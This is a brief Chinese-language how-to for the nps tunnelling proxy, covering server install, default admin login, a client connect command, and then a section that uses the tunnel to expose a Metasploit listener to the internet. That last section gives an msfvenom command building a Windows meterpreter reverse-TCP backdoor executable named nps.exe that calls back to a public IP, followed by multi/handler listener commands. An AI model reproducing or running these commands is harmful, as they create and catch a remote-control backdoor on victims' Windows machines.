<https://github.com/ehang-io/nps>
nps是一款轻量级、高性能、功能强大的内网穿透代理服务器。
目前支持tcp、udp流量转发，可支持任何tcp、udp上层协议（访问内网网站、本地支付接口调试、ssh访问、远程桌面，内网dns解析等等），此外还支持内网http代理、内网socks5代理、p2p等，
并带有功能强大的web管理端，相当于多功能版frp。

## **服务端**
./nps install
./nps

此时访问后台ip:8080
账号admin，密码123

进入后台
创建隧道客户端，生成密钥
添加协议，绑定端口
如：远程5555穿透到本地6666

## **客户端**
连接服务端：
./npc -server=47.94.236.117:8024 -vkey=uajwhbu9155qh89v2

## **内网MFS变公网**
生成后门：
msfvenom -p windows/meterpreter/reverse_tcp lhost=47.94.236.117 lport=5555 -f exe -o nps.exe
监听：
内网机MSF监听2222端口
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set lhost 192.168.1.6
set lport 6666
run


